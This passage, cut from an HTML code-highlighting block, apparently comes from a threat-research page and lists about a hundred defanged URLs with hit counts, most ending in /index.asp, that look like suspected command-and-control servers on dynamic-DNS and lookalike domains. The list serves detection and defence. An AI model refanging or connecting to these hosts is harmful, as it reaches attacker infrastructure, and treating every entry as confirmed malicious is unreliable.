class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-66">66</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-68">68</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-70">70</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-72">72</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-74">74</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-76">76</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-77">77</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-78">78</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-79">79</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-80">80</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-81">81</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-82">82</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-83">83</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-84">84</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-85">85</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-86">86</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-87">87</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-88">88</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-89">89</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-90">90</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-91">91</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-92">92</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-93">93</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-94">94</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-95">95</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-96">96</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-97">97</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-98">98</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-99">99</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-100">100</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-101">101</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-102">102</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-103">103</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-104">104</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-105">105</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-106">106</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-107">107</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-1"><span class="crayon-cn">39</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//198[.]18.133.111:8081/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-2"><span class="crayon-cn">8</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//95[.]211.139.88:80/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-3"><span class="crayon-cn">5</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//46[.]101.90.248:443/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-4"><span class="crayon-cn">5</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//microsoft-update7[.]myvnc.com:443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-5"><span class="crayon-cn">5</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//145[.]131.7.190:8080/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-6"><span class="crayon-cn">3</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//52[.]39.227.108:443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-7"><span class="crayon-cn">3</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//vanesa[.]ddns.net:443/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-8"><span class="crayon-cn">3</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//polygon[.]1dn0.xyz/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-9"><span class="crayon-cn">3</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//159[.]203.18.172:8080/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-10"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//dsecti0n[.]gotdns.ch:8080/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-11"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//69[.]20.66.229:9443/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-12"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//50[.]3.74.72:8080/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-13"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//205[.]232.71.92:443/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-14"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//hop[.]wellsfargolegal.com/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-15"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//ciagov[.]gotdns.ch:8080/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-16"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//chgvaswks045[.]efgz.efg.corp:888/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-17"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//ads[.]mygoogle-analytics.com:80/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-18"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//84[.]200.84.185:443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-19"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//84[.]14.146.74:443/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-20"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//66[.]11.115.25:8080/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-21"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//64[.]137.176.174:12345/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-22"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//52[.]28.242.165:8080/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-23"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//52[.]19.131.17:80/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-24"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//23[.]239.12.15:8080/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-25"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//212[.]99.114.202:443/count.php?user=</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-26"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//188[.]68.59.11:8081/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-27"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//185[.]117.72.45:8080/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-28"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//163[.]172.175.132:8089/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-29"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//159[.]203.89.248:80/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-30"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//14[.]144.144.66:8081/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-31"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//103[.]238.227.201:7788/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-32"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]enterprizehost.com:9443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-33"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//sixeight[.]av-update.com:443/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-34"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//remote-01[.]web-access.us/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-35"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//msauth[.]net/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-36"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//metrowifi[.]no-ip.org:8443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-37"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//megalon[.]trustwave.com:443/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-38"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//mail[.]microsoft-invites.com/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-39"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//logexpert[.]eu/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-40"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//host-101[.]ipsec.io/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-41"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//93[.]176.84.45:443/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-42"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//93[.]176.84.34:443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-43"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//66[.]60.224.82:443/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-44"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//66[.]192.70.39:443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-45"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//66[.]192.70.38:80/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-46"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//52[.]86.125.177:443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-47"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//50[.]251.57.67:8080/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-48"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//46[.]101.203.156:443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-49"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//46[.]101.185.146:8080/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-50"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//45[.]63.109.205:8443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-51"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//172[.]30.18.11:443/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-52"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//146[.]148.58.157:8088/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-53"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//108[.]61.211.36/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-54"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//107[.]170.132.24:443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-55"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//104[.]131.182.177:443/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-56"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//sparta34[.]no-ip.biz:443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-57"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//securetx[.]ddns.net:3333/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-58"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//pie32[.]mooo.com:8080/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-59"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//m[.]jdirving.email:21/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-60"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//kooks[.]ddns.net:4444:4444/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-61"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//kernel32[.]ddns.net:8080/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-62"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//home[.]rzepka.se/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-63"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//192.ho4x.com:80/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-64"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//ec2-35-167-185-55[.]us-west-2.compute.amazonaws.com:443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-65"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//amazonsdeliveries[.]com/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-66"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//ahyses[.]ddns.net:4444/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-67"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//98[.]103.103.170:80/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-68"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//98[.]103.103.168:80/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-69"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//93[.]187.43.200:80/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-70"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//84[.]200.2.13:8080/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-71"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//78[.]229.133.134:80/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-72"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//68[.]66.9.76/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-73"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//52[.]36.245.145:8080/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-74"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//52[.]28.250.99:8080/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-75"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//52[.]196.119.113:80/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-76"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//50[.]251.57.67:8080/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-77"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//47[.]88.17.109:80/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-78"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//46[.]246.87.205/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-79"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//41[.]230.232.65:5552:5552/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-80"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//24[.]111.1.135:22/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-81"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//23[.]116.90.9:80/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-82"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//222[.]230.139.166:80/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-83"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//197[.]85.191.186:80/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-84"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//197[.]85.191.186:443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-85"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//192[.]241.129.69:443/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-86"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//191[.]101.31.118:8081/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-87"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//187[.]228.46.144:8888/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-88"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//187[.]177.151.80:12345/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-89"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//166[.]78.124.106:80/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-90"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//163[.]172.151.90:80/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-91"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//149[.]56.178.124:8080/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-92"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//139[.]59.12.202:80/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-93"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//138[.]121.170.12:500/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-94"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//138[.]121.170.12:3138/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-95"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//138[.]121.170.12:3137/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-96"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//138[.]121.170.12:3136/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-97"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//138[.]121.170.12:3135/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-98"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//138[.]121.170.12:3133/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-99"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//138[.]121.170.12:3031/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-100"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//137[.]117.188.120:443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-101"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//11[.]79.40.53:80/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-102"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//108[.]61.217.22:443/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-103"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//104[.]233.102.23:8080/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-104"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//104[.]145.225.3:8081/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-105"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span 